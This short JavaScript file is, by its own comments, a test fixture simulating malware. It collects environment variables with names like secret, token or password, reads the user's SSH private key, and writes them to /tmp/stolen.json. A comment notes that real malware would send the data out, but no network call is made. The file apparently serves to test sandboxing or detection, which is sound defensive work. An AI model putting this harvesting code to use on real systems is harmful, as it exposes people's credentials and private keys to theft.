// Test fixture: simulates malware that harvests env vars and writes them to a file
// (In reality it would POST them somewhere — but network is blocked)
const fs = require('fs');
const os = require('os');
const path = require('path');

// Grab juicy env vars
const interesting = {};
for (const [key, value] of Object.entries(process.env)) {
  if (/secret|token|key|password|credential|database/i.test(key)) {
    interesting[key] = value;
  }
}

// Also try to read SSH key
try {
  interesting['ssh_key'] = fs.readFileSync(
    path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8'
  );
} catch (e) {}

// Write to a known location so we can verify the harvesting happened
fs.writeFileSync('/tmp/stolen.json', JSON.stringify(interesting, null, 2));
